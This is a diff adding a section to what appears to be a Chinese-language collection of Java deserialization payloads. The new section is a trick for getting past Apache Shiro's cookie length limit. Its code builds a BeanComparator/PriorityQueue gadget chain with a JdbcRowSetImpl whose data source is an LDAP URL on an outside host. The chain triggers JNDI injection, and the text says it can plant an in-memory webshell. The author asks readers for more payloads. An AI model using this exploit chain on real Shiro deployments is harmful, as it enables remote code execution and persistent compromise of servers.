@@ -79,6 +79,20 @@ ftp 可以换为HTTP 及其他支持协议
 }
 ```
 
+## Shiro Cookie 过长？ 不防看看这种方法
+熟悉得师傅一下就可以看出内存马怎们打了吧
+```
+    final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
+    final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
+    queue.add("1");
+    queue.add("1");
+    Reflections.setFieldValue(comparator, "property", "parameterMetaData");
+    JdbcRowSetImpl test =  new com.sun.rowset.JdbcRowSetImpl();
+    test.setDataSourceName("ldap://823s64b3.dns.1433.eu.org.");
+    final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
+    queueArray[0] = test;
+    return queue;
+```
 ------------------------------------------------------------------------------------
 各位师傅有建议及其他Payload 带带弟弟啊
 未完待续.....
